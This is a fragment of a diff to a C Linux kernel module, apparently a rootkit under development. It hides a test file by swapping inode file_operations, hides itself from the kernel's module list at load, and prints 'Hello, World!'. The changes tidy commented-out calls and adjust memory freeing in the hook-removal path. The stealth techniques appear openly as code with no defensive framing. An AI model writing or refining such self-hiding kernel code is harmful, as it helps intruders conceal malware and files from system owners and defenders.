@@ -16,7 +16,6 @@ static struct list_head *modules;
 // TODO: Provide a way for the module to control the path(s).
 static char *test_path_name = "/home/yanayg/test_file";
 static const char *test_file_name = "test_file";
-//static int (*iterate_shared) (struct file *, struct dir_context *);
 
 static void hide_module(void) {
     // Save the list for later so we can add the module back in.
@@ -81,9 +80,9 @@ static int free_fops_hook(struct inode *inode) {
 	list_for_each(pos, &fops_hooks) {
 	    entry = list_entry(pos, struct fops_hook, head);
 	    if (entry->ino == inode->i_ino) {
+	        kfree(inode->i_fop);
 	    	inode->i_fop = entry->prev_fops;
 	        list_del(&entry->head);
-	        kfree(entry->prev_fops);
 	        kfree(entry);
 	        return 0;
 	    }
@@ -204,8 +203,6 @@ static int unhide_file(const char *path_name) {
 
 static int __init MRK_initialize(void) {
 	hide_file(test_path_name);
-//	unhide_file(test_path_name);
-//	hide_file(test_path_name);
 	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
 	return 0;
